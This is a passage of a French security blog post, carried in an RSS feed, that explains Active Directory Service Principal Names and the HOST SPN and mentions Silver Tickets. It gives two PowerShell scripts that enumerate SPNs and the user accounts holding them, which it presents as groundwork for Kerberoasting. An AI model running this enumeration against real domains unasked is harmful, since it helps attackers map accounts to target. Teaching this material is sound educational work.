&lt;p&gt;Ainsi, si jamais un utilisateur cherche le SPN &lt;code class=&quot;highlighter-rouge&quot;&gt;www&lt;/code&gt; sur la machine &lt;code class=&quot;highlighter-rouge&quot;&gt;WEB-SERVER-01&lt;/code&gt;, l’AD cherchera &lt;code class=&quot;highlighter-rouge&quot;&gt;www/WEB-SERVER-01&lt;/code&gt; mais il cherchera également &lt;code class=&quot;highlighter-rouge&quot;&gt;HOST/WEB-SERVER-01&lt;/code&gt;. Si la machine possède le SPN &lt;code class=&quot;highlighter-rouge&quot;&gt;HOST&lt;/code&gt; alors cela veut dire qu’elle possède le SPN &lt;code class=&quot;highlighter-rouge&quot;&gt;www&lt;/code&gt; (et beaucoup d’autres).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note :&lt;/strong&gt; Ce SPN (&lt;code class=&quot;highlighter-rouge&quot;&gt;HOST&lt;/code&gt;) reste un peu un mystère pour moi. En effet, lors de la génération d’un &lt;a href=&quot;/kerberos-silver-golden-tickets&quot;&gt;Silver Ticket&lt;/a&gt;, si on décide que le SPN est &lt;code class=&quot;highlighter-rouge&quot;&gt;HOST&lt;/code&gt;, alors on peut effectuer certaines tâches telles que la gestion des services ou la gestion des tâches planifiées. Cependant, bien que &lt;code class=&quot;highlighter-rouge&quot;&gt;CIFS&lt;/code&gt; soit inclu dans l’attribut &lt;code class=&quot;highlighter-rouge&quot;&gt;SPN-Mappings&lt;/code&gt;, je n’étais pas en mesure d’accéder au partage &lt;code class=&quot;highlighter-rouge&quot;&gt;C$&lt;/code&gt; de la machine.&lt;/p&gt;

&lt;p&gt;En posant la question sur le &lt;a href=&quot;https://bloodhoundgang.herokuapp.com/&quot;&gt;slack de Bloodhound&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/pyrotek3&quot;&gt;@pyrotek3&lt;/a&gt; (&lt;a href=&quot;https://adsecurity.org/?page_id=8&quot;&gt;ADSecurity.org&lt;/a&gt;) m’a répondu ceci :&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;I have seen the same thing. You would think that HOST would handle most things for the Windows system, but there are certain types of calls that need more than HOST since its a catch-all. I only figured out what worked through trial and error (and lots of testing).
From what I have seen HOST can provide SPN coverage and is a “catch-all” for standard system SPNs so the same SPNs don’t have to be registered on every system. For “privileged” type activity, using CIFS seems to be required. For Silver Tickets, you can use whatever SPN you want (provided the system will respond) since the DC isn’t involved and the SPNs registered on the computer account in AD doesn’t really matter (since you create the ticket and connect directly to the system bypassing the DC and AD).
It has been a while since I dug into this.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Si quelqu’un est en mesure d’apporter des précisions, n’hésitez pas à les partager via les commentaires ou en me contactant sur Twitter (&lt;a href=&quot;https://twitter.com/HackAndDo&quot;&gt;@HackAndDo&lt;/a&gt;).&lt;/p&gt;

&lt;h2 id=&quot;en-pratique&quot;&gt;En pratique&lt;/h2&gt;

&lt;p&gt;Voici un petit script PowerShell qui permet de lister les SPNs présents dans l’Active Directory. Le filtre utilisé est &lt;code class=&quot;highlighter-rouge&quot;&gt;(servicePrincipalName=*)&lt;/code&gt; qui retourne les résultats avec l’attribut non nul.&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$search&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DirectoryServices.DirectorySearcher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;ADSI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$search&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;(servicePrincipalName=*)&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$results&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$search&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Findall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$results&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$userEntry&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetDirectoryEntry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Write-host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Object : &quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$userEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;(&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$userEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;distinguishedName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Write-host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;List SPN :&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;        
	&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SPN&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$userEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;servicePrincipalName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
		&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Write-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SPN&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;       
	&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Write-host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ce qui donne en lab :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/03/SPNListPowershell.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/03/SPNListPowershell.png&quot; alt=&quot;SPN MapListpings&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;On voit apparaitre les différents objets possédant au moins un attribut SPN.&lt;/p&gt;

&lt;p&gt;Si nous ne voulions voir que les comptes utilisateurs qui possèdent un (ou plusieurs SPNs), voici une solution possible :&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$search&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DirectoryServices.DirectorySearcher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;ADSI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$search&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;(&amp;amp;(objectCategory=person)(objectClass=user)(servicePrincipalName=*))&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$results&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$search&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Findall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$results&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$userEntry&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetDirectoryEntry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Write-host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;User : &quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$userEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;(&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$userEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;distinguishedName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Write-host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;SPNs&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;        
	&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SPN&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$userEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;servicePrincipalName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
		&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SPN&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;       
	&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Write-host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Dans mon lab, voilà le résultat de ce script :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/03/SPNListUsersPowershell.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/03/SPNListUsersPowershell.png&quot; alt=&quot;SPN MapListpings&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Cette requête sera pratique pour une attaque que nous décrirons dans le prochain article, le &lt;strong&gt;Kerberoasting&lt;/strong&gt;.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Cet article relativement court a permis de lever le voile sur la notion de SPN qui sera utilisée à diverses reprises. Ce n’est pas quelque chose de compliqué, cependant je trouvais que les documentations étaient toujours vagues. Je complèterai cet article si jamais d’autres éclaircissements sont nécessaires.&lt;/p&gt;

&lt;p&gt;Si vous avez des précisions ou des corrections, n’hésitez pas à les partager, comme à chaque fois !&lt;/p&gt;
</description>
        <pubDate>Fri, 08 Mar 2019 10:17:22 +0100</pubDate>
        <link>http://localhost:4000//service-principal-name-spn/</link>
        <guid isPermaLink="true">http://localhost:4000//service-principal-name-spn/</guid>
        
        <category>Active Directory</category>
        
        <category>Windows</category>
        
        
      </item>
    
  </channel>
</rss>
